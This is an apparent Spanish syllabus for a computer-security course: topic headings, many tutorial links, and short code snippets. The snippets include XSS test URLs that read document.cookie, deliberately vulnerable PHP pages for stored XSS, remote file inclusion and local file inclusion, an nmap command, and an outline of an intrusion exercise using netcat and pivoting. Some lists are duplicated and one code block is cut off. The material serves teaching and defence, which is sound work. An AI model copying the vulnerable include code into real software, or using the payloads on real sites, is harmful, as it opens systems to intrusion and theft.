**Introducción a SAD**

- ¿De qué va la asignatura?
- ¿Cómo voy a evaluar la asignatura?
- Mezcla de tecnologías
- Utilizar Github
  - https://github.com/jesusninoc/ClasesSAD
  - https://github.com/jesusninoc/scripting-and-security-1
  - https://github.com/jesusninoc/scripting-and-security-2

# Adopción de pautas de seguridad informática

## Visión global de la seguridad informática.

**Áreas de interés en seguridad**

- Evasión, estudios sobre Malware & Reversing
- Honeypots/Honeynets
- Seguridad del Navegador
- Estudios o soluciones ante Data Leakage (fugas de información).
- Hardware Hacking
- Gestión de Logs.
- Seguridad en terceras partes.
- Análisis de código fuente [SLDC].
- Herramientas / Estudios para la gestión / orientación de un BCP, SGSI.
- Nuevas vulnerabilidades y Exploits / 0-days
- Seguridad y técnicas de exp. de SCADA/ICS.
- Seguridad en apps. y sistemas médicos.
- Seguridad aplicada en Automoción.
- Evasión, estudios sobre Malware & Reversing
- Honeypots/Honeynets
- Seguridad del Navegador
- Estudios o soluciones ante Data Leakage (fugas de información).
- Hardware Hacking
- Gestión de Logs.
- Seguridad en terceras partes.
- Análisis de código fuente [SLDC].
- Herramientas / Estudios para la gestión / orientación de un BCP, SGSI.
- Nuevas vulnerabilidades y Exploits / 0-days
- Seguridad y técnicas de exp. de SCADA/ICS.
- Seguridad en apps. y sistemas médicos.

## Fiabilidad, confidencialidad, integridad y disponibilidad.

**Análisis de configuraciones de alta disponibilidad**
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2017/2017-10-02.md

**Servidores redundantes de bases de datos**

**Análisis de configuraciones de alta disponibilidad**

**Sistemas de archivos distribuidos**
* https://github.com/jesusninoc/ClasesASO/blob/master/2020-02-04.md#recursos-compartidos-en-red-y-sistemas-de-archivos-distribuidos
**Sistemas de «clusters»**
* https://www.youtube.com/watch?v=Kjwa086AP7g

## Elementos vulnerables en el sistema informático: hardware, software y datos.

**Análisis de ficheros dll**
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2017/2017-10-03.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-09-17.md#obtener-informaci%C3%B3n-de-los-equipos
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-10-24.md

**Introducción dll**
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-29.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-30.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-31.md
* https://www.jesusninoc.com/11/28/crear-compilar-y-ejecutar-una-dll-con-microsoft-visual-c-que-abre-notepad-desde-powershell/
* https://github.com/jesusninoc/ClasesISO/blob/master/2019-04-04.md
* https://www.jesusninoc.com/02/05/crear-un-usuario-local-con-contrasena-en-windows-10/
* https://www.jesusninoc.com/11/29/crear-compilar-y-ejecutar-una-dll-con-microsoft-visual-c-que-crear-un-usuario-desde-powershell/
* https://www.jesusninoc.com/01/27/comprobar-si-ha-cambiado-algun-fichero-utilizando-la-funcion-hash-sha1/
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-05.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-09.md
* https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
**CREAR UN FICHERO DE VOLCADO DE MEMORIA DE UN PROCESO Y DETECTAR DLL**
* https://www.jesusninoc.com/10/22/crear-un-fichero-de-volcado-de-memoria-de-un-proceso-y-detectar-dll/
**ANALIZAR UN FICHERO EXE CON FLOSS**
* https://www.jesusninoc.com/10/21/analizar-un-fichero-exe-con-floss/
**CREAR, COMPILAR Y EJECUTAR UNA DLL CON MICROSOFT VISUAL C# QUE EJECUTE UN CMDLET DE POWERSHELL**
* https://www.jesusninoc.com/11/26/crear-compilar-y-ejecutar-una-dll-con-microsoft-visual-c-que-ejecute-un-cmdlet-de-powershell/
**LISTAR FUNCIONES EXPORTADAS DE UN ARCHIVO DLL CON DUMPBIN DESDE POWERSHELL**
* https://www.jesusninoc.com/04/19/listar-funciones-exportadas-de-un-archivo-dll-con-dumpbin-desde-powershell/
**OBTENER LOS NOMBRES DE LAS FUNCIONES EXPORTADAS DE UN ARCHIVO DLL CON DUMPBIN DESDE POWERSHELL (EXPLICACIÓN PASO A PASO DEL SCRIPT)**
* https://www.jesusninoc.com/04/21/obtener-los-nombres-de-las-funciones-exportadas-de-un-archivo-dll-con-dumpbin-desde-powershell-explicacion-paso-a-paso-del-script/

**Analizar class**

- JD-GUI
https://www.jesusninoc.com/02/10/jd-gui/

**reuse the session for as many queries as you like**

$sh = Get-CimInstance -ClassName Win32_Share -CimSession $session -Filter 'Name="Admin$"'
$se = Get-CimInstance -ClassName Win32_Service -CimSession $session

**Uso de DLL**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-29.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-30.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-31.md
* https://www.jesusninoc.com/11/28/crear-compilar-y-ejecutar-una-dll-con-microsoft-visual-c-que-abre-notepad-desde-powershell/
* https://github.com/jesusninoc/ClasesISO/blob/master/2019-04-04.md
* https://www.jesusninoc.com/02/05/crear-un-usuario-local-con-contrasena-en-windows-10/
* https://www.jesusninoc.com/11/29/crear-compilar-y-ejecutar-una-dll-con-microsoft-visual-c-que-crear-un-usuario-desde-powershell/
* https://www.jesusninoc.com/01/27/comprobar-si-ha-cambiado-algun-fichero-utilizando-la-funcion-hash-sha1/
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-05.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-09.md
* https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
* https://github.com/fdiskyou/injectAllTheThings

**Reverse engineering**

* https://www.jesusninoc.com/11/20/apktool/
* https://www.jesusninoc.com/02/09/crear-compilar-generar-y-ejecutar-un-jar-de-java-que-ejecuta-un-cmdlet-de-powershell-utilizando-runtime/

**Análisis de un dispositivo USB**

* https://www.jesusninoc.com/05/01/usbpcap-usb-packet-capture-for-windows/
* https://hacking-etico.com/2016/03/10/analisis-usb-wireshark-parte-2

**Hardware**

* https://www.hackerarsenal.com/collections/frontpage/products/wimonitor
* https://shop.hak5.org/collections/all
* http://www.keelog.com/es/

## Análisis de las principales vulnerabilidades de un sistema informático.

**Máquina virtual vulnerable**

* https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide
* https://www.fwhibbit.es/guia-metasploitable-2-parte-1
* https://www.fwhibbit.es/guia-metasploitable-2-parte-2
* https://www.fwhibbit.es/guia-metasploitable-2-parte-3
* https://www.redinskala.com/2013/05/14/comandos-metasploit/
* https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
```bash
nmap -sV -sC -sS -p
```

**Otras máquinas**

* https://github.com/jesusninoc/Seguridad/blob/master/M%C3%A1quinas%20vulnerables.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-03-07.md
* https://www.vulnhub.com/entry/gameover-1,16/
* https://www.kitploit.com/2018/05/owasp-juice-shop-intentionally-insecure.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29
* https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html

**Uncover Tiny URLs**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-03-08.md

**Introduccion a OWASP Top Ten 2017**

* https://www.jesusninoc.com/12/29/introduccion-a-owasp-top-ten-2017/

**Manipulación de ficheros PDF**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-03-06.md
* https://www.jesusninoc.com/08/17/crear-un-pdf-utilizando-powershell/
* https://www.jesusninoc.com/02/17/crear-un-fichero-pdf-con-un-script-embebido-de-javascript/

**Introducción al exploiting**

* https://ironhackers.es/tutoriales/introduccion-al-exploiting-parte-1-stack-0-2-protostar/
* https://ironhackers.es/tutoriales/introduccion-al-exploiting-parte-2-stack-3-4-protostar/

**Reconocimiento**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-01-24.md#reconocimiento-recolectar-informaci%C3%B3n
* https://noticiasseguridad.com/tutoriales/the-harvester-busque-a-los-empleados-que-trabajan-en-una-empresa/

**Manipulación QR**

* https://www.jesusninoc.com/05/27/crear-codigo-qr-para-una-ubicacion-gps/
* https://www.jesusninoc.com/05/23/crear-codigo-qr-para-la-conexion-wifi/
* https://www.jesusninoc.com/06/01/crear-y-leer-un-codigo-qr-con-un-comando-en-bash-mediante-wsl-desde-powershell/
* https://www.jesusninoc.com/06/05/crear-un-servidor-web-con-un-servicio-que-permita-leer-un-codigo-qr-desde-powershell/
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-02.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-10.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-12.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-20.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-05-05.md
- https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Lin-Industrial-Remote-Controller.pdf
- https://www.blackhat.com/asia-19/briefings/schedule/#industrial-remote-controller-safety-security-vulnerabilities-13676

## Amenazas. Tipos:


### Amenazas físicas.

- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-09-25.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-10-01.md#seguridad-l%C3%B3gica
- https://medium.com/forensicitguy/making-meterpreter-look-google-signed-using-msi-jar-files-c0a7970ff8b7

### Amenazas lógicas.

**Antivirus realizado por Miguel (MikeRuSe)**

* https://github.com/MikeRuSe/Scripts/tree/master/Antivirus_Proyect
- http://www.keelog.com/es/usb-keylogger/
- https://www.jesusninoc.com/antivirus/

**Código del antivirus**
```PowerShell
**Buscar el hash de un archivo en VirusTotal**
**Testeado y desarrollado en Windows 8.1 Pro y en Windows 10 Pro**
**Registrar la API Key: https://www.virustotal.com/gui/join-us**
**Es recomendable cambiar la API de abajo**
    $VT_API = "45eb6546356546346454dgfhdfhdfghdgfh977"
**Establecemos el protocolo TLS 1.2**
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Function submit-VTHash($VThash)
{
    $VTcuerpo = @{resource = $VThash; apikey = $VT_API}
    $VTresultado = Invoke-RestMethod -Method GET -Uri 'https://www.virustotal.com/vtapi/v2/file/report' -Body $VTcuerpo

    return $vtResultado
}

**Menú personalizado**
$Titulo = 'ANTIVIRUS v1.0.4 by www.github.com/MikeRuSe'
Clear-Host
    Write-Host "                " -NoNewline; Write-Host "====================== $Titulo ======================" -ForegroundColor Gray
    Write-Host " "
    Write-Host "                                                    " -NoNewline;Write-Host "¿Qué desea analizar?" -ForegroundColor Green
    Write-Host " "
    Write-Host "                 " -NoNewline; Write-Host " Presione '1' para analizar un hash" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione '2' para analizar un archivo" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione '3' para analizar una carpeta y sus archivos (pueden no aparecer todos los datos de los archivos...)" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione '4' para recuperar contraseñas WiFi" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione otra tecla para salir" -ForegroundColor Red
    Write-Host " "

**Bifrost (Trojan horse)**

The server builder component has the following capabilities:

- Create the server component
- Change the server component's port number and/or IP address
- Change the server component's executable name
- Change the name of the Windows registry startup entry
- Include rootkit to hide server processes
- Include extensions to add features (adds 22,759 bytes to server)
- Use persistence (makes the server harder to remove from the infected system)

The client component has the following capabilities:

- Process Manager (Browse or kill running processes)
- File manager (Browse, upload, download, or delete files)
- Window Manager (Browse, close, maximize/minimize, or rename windows)
- Get system information
- Extract passwords from machine
- Keystroke logging
- Screen capture
- Webcam capture
- Desktop logoff, reboot or shutdown
- Registry editor
- Remote shell

**Acabar práctica Bifrost**

* https://github.com/jesusninoc/ClasesSAD/blob/master/2019-11-25.md#bifrost-trojan-horse

**Subir una imagen que tenga un virus y poder ejecutar el virus después**

- ¿Cómo subes el virus?
- ¿Cómo se ejecuta el virus?
- ¿El virus se puede subir a Pinterest o a Instagram?

**Ayuda**
**Cargar en memoria y ejecutar un payload de ejecución de comandos arbitrarios en PowerShell**
https://www.jesusninoc.com/2017/02/16/cargar-en-memoria-y-ejecutar-un-payload-de-ejecucion-de-comandos-arbitrarios-en-powershell/
**Codificar una imagen en Base64 con PowerShell**
https://www.jesusninoc.com/2017/03/07/codificar-una-imagen-en-base64-con-powershell/
**Invoke-PSImage**
https://github.com/peewpw/Invoke-PSImage

**Virus y antivirus**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-24.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-28.md
* https://github.com/jesusninoc/Seguridad/blob/master/Una%20aproximaci%C3%B3n%20a%20los%20virus%20en%20PowerShell.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-19.md#antivirus

**Keylogger**

* https://www.jesusninoc.com/03/11/keylogger-sencillo-con-powershell/
* https://www.jesusninoc.com/07/16/transfer-keylogger-log-file-between-server-and-client-sockets-tcp/
* http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
* https://github.com/vacmf/powershell-scripts/blob/master/powershell-keylogger.ps1
* https://www.jesusninoc.com/04/30/enviar-datos-a-un-formulario-de-google-docs-desde-powershell-deducir-los-parametros-que-se-envian-por-post/

**Shellcode**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-08.md
* https://gist.github.com/Arno0x/17d1705ecfc945088579c84994a652d3

**Infección de procesos en Linux**

* https://www.tarlogic.com/blog/infeccion-procesos-linux-parte-i/

**USB Rubber Ducky**

* https://shop.hak5.org/products/usb-rubber-ducky-deluxe
* https://www.jesusninoc.com/03/09/scripts-en-rubber-ducky-parte-1/
* https://www.jesusninoc.com/03/20/scripts-en-rubber-ducky-parte-2/
* https://www.jesusninoc.com/ducky-scripts/

**Macros**

* https://social.technet.microsoft.com/Forums/windowsserver/en-US/4425e609-1353-4b03-b9d9-ed4a3bc5e365/running-an-excel-macro-from-powershell?forum=winserverpowershell
* https://www.blackhillsinfosec.com/phishing-with-powerpoint/
* https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/invoking-excel-macros-from-powershell

## Tipos de ataques.

**ENVIAR PAQUETES DE DESASOCIACIÓN CON AIREPLAY-NG A UN CLIENTE QUE ACTUALMENTE ESTÁ ASOCIADO CON UN PUNTO DE ACCESO EN LINUX REALIZANDO UNA CONEXIÓN SSH DESDE POWERSHELL EN WINDOWS**

* https://www.jesusninoc.com/10/16/enviar-paquetes-de-desasociacion-con-aireplay-ng-a-un-cliente-que-actualmente-esta-asociado-con-un-punto-de-acceso-en-linux-realizando-una-conexion-ssh-desde-powershell-en-windows/

**Ataques DoS**

* https://www.jesusninoc.com/02/17/ataques-dos/

**Parar un DDoS**

* https://github.com/llaera/slowloris.pl
* http://redesdecomputadores.umh.es/iptables.htm
* https://github.com/jesusninoc/Scripts
* https://github.com/jesusninoc/Scripts/blob/master/MySQL%20dump%20completo.sh
* https://github.com/jesusninoc/Scripts/blob/master/Parar%20consultas%20que%20tardan%20en%20ejecutarse%20en%20MySQL.sh
* https://github.com/jesusninoc/Scripts/blob/master/Reiniciar%20Apache%20y%20MySQL%20si%20el%20porcentaje%20de%20memoria%20ocupado%20es%20mayor%20del%2090%25.sh
* https://github.com/jesusninoc/Scripts/blob/master/Scripts%20para%20un%20administrador%20de%20sistemas
* https://github.com/jesusninoc/Scripts/blob/master/Ver%20si%20Apache%20est%C3%A1%20encendido.sh
* https://github.com/jesusninoc/Scripts/blob/master/Ver%20si%20MySQL%20est%C3%A1%20encendido.sh

**DNS**
- https://0xword.com/es/libros/26-libro-ataques-redes-datos-ipv4-ipv6.html
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-03-07.md#lfirfi
- https://www.youtube.com/watch?v=kObmGuunRO8

**Ataques DNS**
* https://github.com/jesusninoc/ClasesISO/blob/master/2019-02-18.md#ataques-dns

**VACIAR Y RESTABLECER EL CONTENIDO DE LA CACHÉ DE RESOLUCIÓN DEL CLIENTE DNS EN WINDOWS 10**
* https://www.jesusninoc.com/07/07/vaciar-y-restablecer-el-contenido-de-la-cache-de-resolucion-del-cliente-dns-en-windows-10/

**DNS-Discovery is a multithreaded subdomain bruteforcer**
* https://github.com/m0nad/DNS-Discovery

**ARP-DNS Spoofing Attack using Cain & Abel**
* https://thelearninggeek.wordpress.com/2012/03/31/arp-dns-spoofing-attack-using-cain-abel/

**ARP-DNS Spoofing Attack using Cain & Abel**

* https://thelearninggeek.wordpress.com/2012/03/31/arp-dns-spoofing-attack-using-cain-abel/
* https://github.com/xchwarze/Cain

**Ejercicio**

**Simular un ataque XSS**
* https://www.jesusninoc.com/01/02/realizar-peticion-http-utilizando-el-metodo-get/
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-03-07.md
* https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
* https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt
```
http://localhost:81/GetPost/exampleget.php?nombre=<img src="http://www.hola.com/wp-content/uploads/2011/07/logo-1.png" alt="Formación Profesional" title="Ciclos Formativos">&submit=Enviar
http://localhost:81/GetPost/exampleget.php?nombre=<script>alert(document.cookie);</script>&submit=Enviar
```

**Ejercicio**

**Simular un ataque XSS persistente**
* https://www.jesusninoc.com/01/02/realizar-peticion-http-utilizando-el-metodo-get/
* https://github.com/jesusninoc/Seguridad/tree/master/GetPost
* https://github.com/jesusninoc/Seguridad/tree/master/UserAgent
* https://coveryourtracks.eff.org/
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-03-07.md
* https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
* https://github.com/jesusninoc/XSS-Payloads/blob/master/payload.txt
* https://github.com/jesusninoc/ClasesIAW/blob/master/2020-11-16.md#insertar-mediante-get-autoincrementando-o-mostrar-un-registro-de-una-tabla
```
http://localhost:81/GetPost/exampleget.php?nombre=<img src="http://www.hola.com/wp-content/uploads/2011/07/logo-1.png" alt="Formación Profesional" title="Ciclos Formativos">&submit=Enviar
http://localhost:81/GetPost/exampleget.php?nombre=<script>alert(document.cookie);</script>&submit=Enviar
```

**Ejercicio**

**XSS persistente**
```PHP
<!DOCTYPE html>
<html>

<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <title>P001</title>
</head>

<body>
    <?php

    // http://localhost/hola.php?enviar=almacenar&nombre=Marcos

        $enviar = "";
        $resultado = "";

        $nombre = ($_GET['nombre']);
        $enviar = ($_GET['enviar']);

        $var = "datos.ini";
        $base = parse_ini_file($var);
        $php = new PDO($base["baseDeDatos"],$base["usuario"],$base["password"]);

        if($enviar == "almacenar")
        {
            $con = $php->prepare("INSERT INTO encabezados VALUES (DEFAULT,:tex);");
            $con->bindParam(':tex',$nombre);
            $con->execute();
            ?><h1><?php echo "" ?></h1><?php
        }
        else
        {
            $con = $php->prepare("SELECT * from encabezados;");
            $con->execute();
            $registros = $con->fetchAll(PDO::FETCH_NUM);
            for ($i=0;$i<9;$i=$i+1){
            $resultado = $registros[$i][1];
            ?><h1><?php echo "$resultado" ?></h1><?php
            }
        }
    ?>
</body>

</html>
```

**RFI**
* https://www.jesusninoc.com/rfi/
**Fichero remoto**
```PHP
<?php echo "hola";?>
```
**Fichero local**
```PHP
<?php echo $_GET['nombre'];
$var=$_GET['nombre'];
include($var);
?>
```
**LFI**
* https://www.jesusninoc.com/lfi/
```PHP
<?php echo $_GET['nombre'];
$var=$_GET['nombre'];
$file = fopen($var, "r");
    while(!feof($file)) {
        echo fgets($file). "<br />";
    }
    fclose($file);
?>
```

**Analizar apk y buscar datos en los ficheros**

- Infected Android Games Spread Adware to More Than 4.5 Million Users
https://www.bleepingcomputer.com/news/security/infected-android-games-spread-adware-to-more-than-4-5-million-users/
- Descargar apk
https://apkpure.com/es/search?q=com.example
- Cómo utilizar Apktool
https://www.jesusninoc.com/2016/02/25/como-utilizar-apktool/
- Analizar permisos de un .apk
https://www.jesusninoc.com/2015/12/08/analizar-permisos-de-un-apk/
- ReverseAPK - Quickly Analyze And Reverse Engineer Android Packages
https://www.kitploit.com/2018/05/reverseapk-quickly-analyze-and-reverse.html

**Buscar información en los ficheros generados al utilizar Apktool**
**Buscar la cadena "php"**
```PowerShell
Get-ChildItem *.* -Recurse | % {gc $_ | Select-String "php"}
```
**Buscar direcciones IP**
```PowerShell
Get-ChildItem *.* -Recurse | % {gc $_ | Select-String "\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"}
```
**Buscar rutas HTTP, FTP**
```PowerShell
Get-ChildItem *.* -Recurse | % {gc $_ | Select-String "\b(ht|f)tp(s?)[^ ]*\.[^ ]*(\/[^ ]*)*\b"}
```

**Detectar XSS**

**Enlaces que permiten ir poco a poco comprendiendo XSS (dónde buscar un XSS y cómo darse cuenta de que ocurre)**
* https://www.jesusninoc.com/12/05/obtener-enlaces-de-una-pagina-web/
* https://www.jesusninoc.com/12/06/obtener-los-enlaces-de-una-pagina-web-y-buscar-si-alguno-contiene-una-cadena-en-concreto/
* https://www.jesusninoc.com/12/06/obtener-los-enlaces-de-una-pagina-web-buscar-si-alguno-contiene-una-cadena-en-concreto-despues-recorrer-ese-enlace-y-detectar-si-se-encuentra-una-palabra-dentro-del-contenido-del-enlace-recorrido/
* https://www.jesusninoc.com/12/06/mostrar-informacion-sobre-los-formularios-que-se-encuentran-dentro-una-web/
* https://www.jesusninoc.com/12/06/obtener-los-enlaces-de-una-pagina-web-y-buscar-si-hay-formularios-en-cada-enlace/
* https://www.jesusninoc.com/12/06/realizar-una-peticion-al-formulario-de-una-pagina-web-automaticamente/
* https://www.jesusninoc.com/12/06/crear-una-funcion-que-pone-una-palabra-en-enfasis-dentro-de-una-frase/
* https://www.jesusninoc.com/12/06/realizar-una-peticion-al-formulario-de-una-pagina-web-automaticamente-y-comprobar-si-se-encuentra-lo-buscado-dentro-del-resultado/

**Ejemplo: verificar si en la página web que analizamos hay enlaces a códigos en php**
```PowerShell

**Ataque (seguridad en la red corporativa)**

**Acercarse al objetivo, ataque paso a paso y fallos posibles**
* https://github.com/jesusninoc/ClasesISO/blob/master/2018-03-01.md

**Ataque (seguridad en la red corporativa)**

**Acercarse al objetivo, ataque paso a paso y fallos posibles**
* https://github.com/jesusninoc/ClasesISO/blob/master/2018-03-01.md

**Ejercicio**

- Obtener datos https://docs.google.com/forms/d/e/1FAIpQLSd7iu5zDmkWuGDVZ5vd3hHgmSZLc2aZpOdTw83CMoJTN78rMA/viewform
- Analizar información con Zoomeye https://www.zoomeye.org/
- Analizar puertos (nmap) https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-28.md
- Buscar vulnerabilidades https://www.exploit-db.com/
- Una vez tomado el control
- Netcat o a nuestro modo
- Colocar un FTP cuanto antes (no vale \\localhost\c$)
- REALIZAR ATAQUE DESDE UN ORDENADOR INTERMEDIO
- Tomar control con Kaht2
- Conectarse entre ordenadores de los que se ha tomado el control

**Ayuda (formulario de Google)**
**ENVIAR DATOS A UN FORMULARIO DE GOOGLE DOCS DESDE POWERSHELL**
* https://www.jesusninoc.com/03/11/enviar-datos-a-un-formulario-de-google-docs-desde-powershell/
**ENVIAR DATOS A UN FORMULARIO DE GOOGLE DOCS DESDE POWERSHELL (DEDUCIR LOS PARÁMETROS QUE SE ENVÍAN POR POST)**
* https://www.jesusninoc.com/04/30/enviar-datos-a-un-formulario-de-google-docs-desde-powershell-deducir-los-parametros-que-se-envian-por-post/
**ACCEDER A LOS DATOS PUBLICADOS EN UN FORMULARIO DE GOOGLE DESDE POWERSHELL**
* https://www.jesusninoc.com/05/01/acceder-a-los-datos-publicados-en-un-formulario-de-google-desde-powershell/

**TCP INJECTION ATTACKS IN THE WILD**

* https://www.blackhat.com/docs/us-16/materials/us-16-Nakibly-TCP-Injection-Attacks-in-the-Wild-A-Large-Scale-Study.pdf
* https://www.youtube.com/watch?v=b4oB1FB_vrM
* http://www.cs.technion.ac.il/~gnakibly/TCPInjections/samples.zip

**DOS**

* https://gist.github.com/steakknife/1865841
* https://github.com/NewEraCracker/LOIC

**BoNeSi: simular una botnet para pruebas DDoS**

* https://www.hackplayers.com/2018/12/bonesi-simular-una-botnet-para-pruebas-ddos.html

**Ataque paso a paso**

* https://github.com/jesusninoc/ClasesISO/blob/master/2018-03-01.md

**XSS**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-03-07.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-12.md

**LFI/RFI**

* https://www.hackingarticles.in/beginner-guide-file-inclusion-attack-lfirfi/
* https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/

**JavaScript embebido**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-26.md

## Valoración de los riesgos

- https://www.jesusninoc.com/02/17/riesgos-en-la-empresa/

## Impactos y repercusión.


## Seguridad física y ambiental:


### Ubicación y protección física de los equipos y servidores. Condiciones ambientales. Plan de seguridad física. Plan recuperación en caso de desastres. Protección del hardware. Control de accesos.


### Sistemas de alimentación ininterrumpida (SAI). Funciones. Tipos.


## Seguridad lógica:


### Criptografía. Cifrado de clave secreta (simétrica o privada). Cifrado de clave pública (asimétrica). Funciones de mezcla o resumen (hash).

**Comprimir y cifrar**

- Primero se comprime y luego se cifra (Teoría de la información y la entropía)
- Si cifras y comprimes el algorimo no funciona bien
- Ataques para descifrar comunicaciones o parte de ellas sin conocer la clave, porque antes la información ha sido comprimida
https://es.wikipedia.org/wiki/BREACH_(ataque)

**Ejercicio**
- https://github.com/jesusninoc/ClasesPSP/blob/master/2019-03-06.md
- https://github.com/jesusninoc/ClasesPSP/blob/master/2019-03-07.md
- https://github.com/jesusninoc/ClasesSAD/blob/master/2019-10-09.md#cifrar-con-un-algoritmo-sencillo-el-nombre-y-el-contenido-de-un-fichero-de-texto
- https://github.com/jesusninoc/ClasesSAD/blob/master/2019-10-09.md#descifrar-el-siguiente-texto
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-10-30.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-10-31.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-23.md#ejercicio-de-powershell--generar-sha1-con-las-palabras-de-un-diccionario

**Descifrar el siguiente texto**
* https://github.com/jesusninoc/ClasesPSP/blob/master/2019-02-21.md#descrifrar-el-siguiente-texto
* https://github.com/jesusninoc/ClasesPSP/blob/master/2019-02-25.md

**Detectar mediante firmas que un fichero se ha infectado**
* https://www.jesusninoc.com/02/17/ejercicios-de-seguridad-detectar-mediante-firmas-que-un-fichero-se-ha-infectado/

**Adivinar un hash utilizando un fichero con hashes generados**
* https://www.jesusninoc.com/02/17/ejercicios-de-seguridad-adivinar-un-hash-utilizando-un-fichero-con-hashes-generados/

**Cifrar con un algoritmo sencillo el nombre y el contenido de un fichero de texto**

https://www.jesusninoc.com/01/23/cifrar-con-un-algoritmo-sencillo-el-nombre-y-el-contenido-de-un-fichero-de-texto/

**Hashes**

**Creating NT4 Password Hashes**
* https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/creating-nt4-password-hashes
**More**
* https://www.youtube.com/watch?v=RhagXOxrneE
* https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/
* https://ehikioya.com/wordpress-password-hash-generator/

**Use PGP Command Line to Create and Manage PGP Keys**

* https://www.maketecheasier.com/pgp-encryption-how-it-works/
* https://www.networkworld.com/article/3293052/encypting-your-files-with-gpg.html

**Ejemplo de comandos PGP**
```CMD
pgp --gen-key "Joe User" --key-type RSA --bits 2048 --passphrase "my passphrase"
pgp --list-keys
pgp --list-keys
pgp --export 0x12345678
pgp --export "Joe User"
pgp --import "Joe User.asc"
```

**Ejemplo cifrar y descifrar un fichero con GPG**
```Bash
gpg --gen-key
gpg --list-keys
echo "hola amigos" > ficheronosecreto
gpg --encrypt --recipient myfriend@gmail.com fichernosecreto
gpg --decrypt --recipient andel ficheronosecreto.gpg
```

**Hash parcial**

* https://github.com/jesusninoc/PowerShell/blob/master/Seguridad/Realizar%20hashes%20parciales%20sobre%20un%20fichero.ps1

**Hash**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-05.md

**Colisiones**

* https://www.jesusninoc.com/02/24/poc-para-detectar-colision-en-sha1-con-powershell/
* http://www.codeproject.com/Questions/458694/Proving-MD-Collision-with-Csharp

**Criptografía con PowerShell**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-01-18.md

**Cifrado sencillo**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-01-30.md

### Sistemas de identificación. Firma electrónica. Certificados digitales Distribución de claves. Infraestructura de clave pública (PKI). DNI electrónico.

**PowerShell**
- https://github.com/jesusninoc/ClasesPSP/blob/master/2019-02-19.md
- https://github.com/jesusninoc/ClasesPSP/blob/master/2019-02-20.md
- https://github.com/jesusninoc/ClasesPSP/blob/master/2019-02-20.md#pasos-para-firmar-un-jar-y-verificar-que-el-fichero-est%C3%A1-firmado

**Creates a new self-signed certificate**
https://www.jesusninoc.com/2017/11/06/creates-a-new-self-signed-certificate/
**Encrypts content by using the Cryptographic Message Syntax format**
